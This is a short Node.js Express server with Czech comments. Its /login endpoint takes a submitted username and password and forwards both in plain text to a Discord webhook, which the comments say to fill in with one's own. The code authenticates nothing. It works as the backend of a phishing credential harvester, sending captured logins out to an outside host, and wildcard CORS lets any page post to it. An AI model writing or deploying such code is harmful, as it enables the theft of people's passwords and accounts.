const express = require("express");
const cors = require("cors");
const fetch = require("node-fetch");

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors()); // ← teď je to na správném místě
app.use(express.json());

const WEBHOOK_URL = "TVŮJ_DISCORD_WEBHOOK"; // nahraď svým skutečným webhookem

app.post("/login", async (req, res) => {
  const { username, password } = req.body;

  const content = `📥 Přihlášení:\nUživatel: **${username}**\nHeslo: **${password}**`;

  try {
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content }),
    });

    res.sendStatus(200);
  } catch (err) {
    console.error("Chyba při odesílání na Discord:", err);
    res.sendStatus(500);
  }
});

app.listen(PORT, () => {
  console.log(`✅ Server běží na portu ${PORT}`);
});

